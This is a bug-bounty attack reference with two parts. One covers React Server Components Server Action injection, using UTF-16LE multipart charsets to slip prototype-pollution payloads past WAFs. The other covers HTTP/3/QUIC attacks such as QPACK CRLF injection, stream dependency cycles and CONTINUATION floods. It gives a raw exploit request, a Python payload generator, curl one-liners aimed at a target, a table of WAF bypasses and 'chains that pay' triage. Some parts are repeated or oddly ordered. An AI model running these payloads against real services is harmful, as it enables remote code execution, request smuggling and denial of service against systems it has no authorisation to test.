# REACT SERVER COMPONENTS (RSC) & HTTP/3 — UNIFIED MASTER REFERENCE
> Merged from: web2-vuln-classes (Sections 29, 30), telegram-intel, github-x-intel (H1 reports, BugXplorer), bountyforge, bb-methodology
> Last updated: 2026-09-22

---

## QUICK START — 5-MINUTE TEST PLAN

```
[ ] 1. Identify Next.js apps (X-Nextjs-Data, __NEXT_DATA__, /_next/ static)
[ ] 2. Find Server Actions ("use server" in JS bundles)
[ ] 3. Test RSC Action injection (Busboy UTF-16LE, prototype pollution)
[ ] 4. Check HTTP/3 support (Alt-Svc: h3, h3-29)
[ ] 5. Test HTTP/3 QPACK header injection, stream dependency cycles
[ ] 6. Test cross-layer state confusion, CONTINUATION floods
[ ] 7. Prove impact: RCE, DoS, credential leak = Critical
```

---

# PART 1: REACT SERVER COMPONENTS (RSC) RCE

> From 2025 H1 reports: Next.js/React Server Components introduce new RCE vectors via server-side execution.

---

## VULNERABLE PATTERNS (2025 H1 Reports)

| Pattern | Report | Technique |
|---|---|---|
| **RSC Action injection** | IBM #3458235 (Critical CVSS 10.0) | `Next-Action` header + multipart/form-data with malicious serialized props |
| **Busboy charset=utf16le bypass** | BugXplorer #4075, H1 reports | WAF misses UTF-16LE encoded payloads that Busboy decodes |
| **FormData parser confusion** | BugXplorer #4075 | `Next-Action` triggers server action with attacker-controlled data |

---

## RSC ACTION EXPLOITATION (Busboy UTF-16LE)

### The Vulnerability
Next.js uses **Busboy** for multipart/form-data parsing. Busboy's `getDecoder(charset)` falls through for UTF-16 aliases:

```javascript
case 'utf16le':
case 'utf-16le':
case 'ucs2':
case 'ucs-2':
  return decoders.utf16le;
```

**The bypass:** `Content-Type: text/plain; charset=utf16le` on a multipart part causes Busboy to decode the part value as UTF-16LE. A WAF inspecting raw bytes sees null-byte-padded garbage; Busboy reads valid ASCII/payload.

### Exploit Payload
```http
POST / HTTP/2
Host: target.com
Next-Action: x
Content-Type: multipart/form-data; boundary=y
Content-Length: [...auto]

--y
Content-Disposition: form-data; name="0"
Content-Type: text/plain; charset=utf16le

[UTF-16LE encoded payload with __proto__ / :constructor keys]
--y
Content-Disposition: form-data; name="1"

"$0"
--y--
```

**WAF Evasion:** WAF sees raw UTF-16 bytes (null-interleaved); Busboy decodes as plain ASCII payload including `__proto__` / `:constructor` keys.

### WAF Ruleset Evolution (CTF Progression)

| Version | New Rule | Bypass |
|---|---|---|
| ver.0 | `if ':constructor' in decoded: block()` | UTF-16LE charset on part — decoded string evades check |
| ver.1 | `if part.filename: continue` (skip file parts) | Add `filename=` to Content-Disposition of payload part |
| ver.3 | `if part.charset != 'utf-8': block()` | Use Undici (FormData) path — Undici ignores per-part charset |
| ver.0.5 | `if '__proto__' or ':constructor' in decoded` | Split payload across 2 form fields (`foo` + payload field) |

### Undici / FormData Path
Node.js built-in Fetch/FormData parser (used for `Next-Action` header RSC requests) — **Undici ignores per-part charset**. Test both Busboy and Undici paths.

---

## TESTING CHECKLIST

```
[ ] Identify Next.js apps (X-Nextjs-Data, __NEXT_DATA__, /_next/ static)
[ ] Find Server Actions: search for "use server" in JS bundles
[ ] Test multipart/form-data with charset=utf16le on each action
[ ] Test Undici (FormData) path — ignores per-part charset
[ ] Probe for prototype pollution via __proto__ / :constructor in action args
[ ] Check for missing auth on server actions (often only client-side gating)
[ ] Test with filename= parameter to bypass file-part skipping
[ ] Test splitting payload across multiple form fields
```

---

## CHAINS THAT PAY

```
RSC Action + missing auth + prototype pollution  → RCE (Critical)
RSC Action + Busboy UTF-16LE + WAF bypass        → RCE (Critical)
RSC Action + IDOR on server action args          → High (cross-user data)
```

### Triage
```
RSC action executes attacker code on server (proven)          = Critical
Prototype pollution in action args + WAF bypass confirmed       = High/Critical
Server action accessible without auth (only client gating)      = High (Auth Bypass)
RSC present but no vulnerable action endpoints                  = Info
```

---

## AUTOMATED TESTING (One-Liners)

```bash
# Detect Next.js
curl -s "https://target.com/" | grep -iE "X-Nextjs-Data|__NEXT_DATA__|/_next/static/"

# Find Server Actions in JS bundles
grep -r "use server" recon/$TARGET/js/ 2>/dev/null | head -20

# RSC Action test (Busboy UTF-16LE)
# Create UTF-16LE payload with __proto__ pollution
python3 -c "
import struct
payload = {'__proto__': {'admin': True}}
import json
data = json.dumps(payload).encode('utf-16le')
with open('payload.utf16le', 'wb') as f:
    f.write(data)
"

# Send RSC Action request
curl -X POST "https://target.com/" \
  -H "Next-Action: x" \
  -H "Content-Type: multipart/form-data; boundary=y" \
  -F '0=@payload.utf16le;type=text/plain;charset=utf16le' \
  -F '1="$0"'

# Test with filename= to bypass file-part skipping
curl -X POST "https://target.com/" \
  -H "Next-Action: x" \
  -H "Content-Type: multipart/form-data; boundary=y" \
  -F '0=@payload.utf16le;type=text/plain;charset=utf16le;filename="x.txt"' \
  -F '1="$0"'

# Test split payload across fields
curl -X POST "https://target.com/" \
  -H "Next-Action: x" \
  -H "Content-Type: multipart/form-data; boundary=y" \
  -F 'foo=bar' \
  -F '0=@payload.utf16le;type=text/plain;charset=utf16le' \
  -F '1="$0"'
```

---

# PART 2: HTTP/3 & QUIC ATTACKS

> From curl 2025 reports: HTTP/3 introduces new smuggling, header injection, and state confusion vectors.

---

## VULNERABLE PATTERNS (curl 2025 H1 Reports)

| Pattern | Report | Technique |
|---|---|---|
| **Stream dependency cycle** | curl #3125832 (High) | HTTP/3 stream dependency manipulation → DoS |
| **Header injection via QPACK** | curl #3479984 (Critical) | CRLF injection in QPACK-compressed headers → protocol smuggling |
| **Cross-layer state confusion** | curl #3480641 (Critical) | Credential/key material leak across HTTP/3 streams |
| **CONTINUATION flood** | curl #3125820 (High) | HTTP/2 CONTINUATION frames → DoS (also affects H3) |

---

## HTTP/3 PRIMER

### Key Differences from HTTP/2
```
Transport: UDP (QUIC) instead of TCP
Multiplexing: Native (no head-of-line blocking)
Header Compression: QPACK (not HPACK)
Encryption: Mandatory (TLS 1.3 built into QUIC)
Streams: Independent, with priorities and dependencies
```

### Key Attack Surfaces
```
1. QPACK Header Compression
   - Dynamic table manipulation
   - CRLF injection in header values
   - Header block fragmentation

2. Stream Management
   - Stream dependency trees
   - Priority manipulation
   - Dependency cycles

3. Connection State
   - 0-RTT / Early data
   - Connection coalescing
   - Cross-stream state sharing

4. Frame Processing
   - HEADERS, DATA, PRIORITY, SETTINGS
   - CONTINUATION-style floods
   - Frame size limits
```

---

## VULNERABLE PATTERNS DETAILED

### 1. Stream Dependency Cycle (curl #3125832)
```bash
# HTTP/3 streams can declare dependencies on other streams
# Creating cycles → infinite loop in scheduler → DoS

# Attack: Send PRIORITY frames creating circular dependencies
# Stream A depends on B, B depends on C, C depends on A
```

### 2. QPACK Header Injection (curl #3479984)
```bash
# QPACK compresses headers using dynamic table
# CRLF injection in header values → header block corruption
# Can lead to request/response smuggling

# Test: Send oversized headers with CRLF in values
# Header: X-Custom: value\r\nInjected-Header: malicious
```

### 3. Cross-Layer State Confusion (curl #3480641)
```bash
# HTTP/3 streams share connection-level state
# Early data / 0-RTT / connection coalescing
# Credential/key material can leak across streams

# Test: Establish multiple streams, send credentials on one
# Check if accessible on another stream
```

### 4. CONTINUATION Flood (curl #3125820)
```bash
# HTTP/2 CONTINUATION frames (also affects H3 via H2/H3 interop)
# Send many CONTINUATION frames without END_HEADERS
# Server buffers indefinitely → memory exhaustion / DoS
```

---

## TESTING CHECKLIST

```
[ ] Identify HTTP/3 support (Alt-Svc: h3, h3-29, h3-27)
[ ] Test QPACK header injection: oversized headers, CRLF in header values
[ ] Test stream dependency manipulation: PRIORITY frames, dependency cycles
[ ] Test cross-stream state: early data, 0-RTT, connection coalescing
[ ] Test CONTINUATION-style flood on H2/H3
[ ] Check for improper frame validation (SETTINGS, HEADERS, DATA, PRIORITY)
[ ] Test 0-RTT replay attacks
[ ] Test connection coalescing (same cert, different origins)
[ ] Test stream prioritization abuse
[ ] Test SETTINGS frame manipulation
```

---

## AUTOMATED TESTING (One-Liners)

```bash
# Check HTTP/3 support
curl -s -I "https://target.com/" | grep -i "alt-svc.*h3"

# HTTP/3 with curl (requires curl with HTTP/3 support)
curl --http3 "https://target.com/" -v

# QPACK header injection test
# Send oversized header with CRLF
curl --http3 -H "X-Custom: $(python3 -c 'print("A"*8000 + "\r\nInjected: evil")')" "https://target.com/"

# Stream dependency test
# Requires HTTP/3 client with PRIORITY frame control
# h2load or custom QUIC client

# CONTINUATION flood (HTTP/2, affects H3 interop)
# h2load -n 10000 -c 100 -m POST https://target.com/

# 0-RTT test
curl --http3 --early-data "https://target.com/"

# Connection coalescing test
# Same cert for multiple origins
curl --http3 "https://target.com/" --resolve "target.com:443:IP" -v
```

---

## TOOLS (Consolidated)

| Tool | Purpose |
|---|---|
| `curl` (with HTTP/3 support) | HTTP/3 testing, RSC Actions |
| `h2load` | HTTP/2/3 load testing, CONTINUATION flood |
| `nghttp3` / `ngtcp2` | QUIC/HTTP/3 client library |
| `nghttp` | HTTP/2/3 client with frame control |
| `quic-go` / `quiche` | QUIC implementation for custom testing |
| `wireshark` / `tshark` | QUIC/HTTP/3 packet analysis |
| `qlog` | QUIC logging for debugging |
| `Burp Suite` | HTTP/3 proxy (experimental) |
| Custom Python/Go | Custom QUIC/HTTP/3 clients for frame manipulation |

---

## TRIAGE DECISION TREE

### RSC
```
1. Is it a Next.js app with Server Actions?
   NO → Not RSC
   YES → Continue

2. Can you reach Server Action endpoint?
   NO → Not exploitable
   YES → Continue

3. Can you deliver UTF-16LE payload?
   NO → WAF blocks
   YES → Continue

4. Does prototype pollution execute?
   NO → Not vulnerable
   YES → Critical (RCE)
```

### HTTP/3
```
1. Does target support HTTP/3?
   NO → Not HTTP/3
   YES → Continue

2. Can you inject QPACK headers?
   NO → Try other vectors
   YES → Critical (smuggling)

3. Can you create stream dependency cycles?
   NO → Try other vectors
   YES → High (DoS)

4. Cross-layer state confusion?
   NO → Try other vectors
   YES → Critical (credential leak)

5. CONTINUATION flood works?
   NO → Try other vectors
   YES → High (DoS)
```

---

## CHAINS THAT PAY (Combined)

```
RSC Action + prototype pollution + WAF bypass          → Critical (RCE)
RSC Action + IDOR on server action args                → High
HTTP/3 QPACK injection → request smuggling             → Critical
HTTP/3 stream dependency cycle → DoS                   → High
HTTP/3 cross-layer state confusion → credential leak   → Critical
HTTP/3 + RSC (if Next.js on HTTP/3)                    → Critical
```

---

## TRIAGE DECISION TREE (Combined)

```
1. Is it Next.js with Server Actions?
   YES → Test RSC Action injection (UTF-16LE, prototype pollution)
   NO → Continue

2. Does target support HTTP/3?
   YES → Test QPACK, stream deps, cross-layer state, CONTINUATION
   NO → Continue

3. Can you prove RCE/DoS/credential leak?
   YES → Critical/High
   NO → Info
```

---

## KILL LIST (Auto-Reject)

| Pattern | Reason |
|---------|--------|
| Next.js but no Server Actions | Not RSC vulnerable |
| Server Actions but no prototype pollution sink | Not exploitable |
| HTTP/3 supported but no QPACK injection | Not vulnerable |
| Stream dependency cycle but no DoS impact | Low/Info |
| Cross-layer state but no credential leak | Not vulnerable |
| "Could chain if..." without demonstration | Theoretical = N/A |

---

## TOOLS (Consolidated)

| Tool | Purpose |
|---|---|
| `curl` (HTTP/3 build) | HTTP/3, RSC Action testing |
| `h2load` | HTTP/2/3 load testing, CONTINUATION flood |
| `nghttp3` / `ngtcp2` | QUIC/HTTP/3 client library |
| `nghttp` | HTTP/2/3 client with frame control |
| `quic-go` / `quiche` | QUIC implementation for custom testing |
| `wireshark` / `tshark` | QUIC/HTTP/3 packet analysis |
| `qlog` | QUIC logging for debugging |
| Custom Python/Go | Custom QUIC/HTTP/3 clients for frame manipulation |

---

## REFERENCES (All Sources)

- web2-vuln-classes: Section 29 (RSC RCE), Section 30 (HTTP/3)
- telegram-intel: @bugbountyresources, @BugXplorer
- github-x-intel: H1 reports (IBM #3458235 Critical, curl 20+ Criticals, BugXplorer #4075); bountyforge RSC context
- bountyforge: RSC/Next.js context, HTTP/3 emerging
- bb-methodology: What-If experiments (RSC Actions, HTTP/3), Tactical Thinking
- PortSwigger: Next.js RSC research, HTTP/3 research
- curl project: 2025 security reports (20+ Criticals)
- Next.js documentation: Server Actions, RSC
- QUIC/HTTP/3 RFCs: RFC 9000 (QUIC), RFC 9114 (HTTP/3), RFC 9204 (QPACK)
- curl project: Security advisories 2025
- Daniel Stenberg: curl security research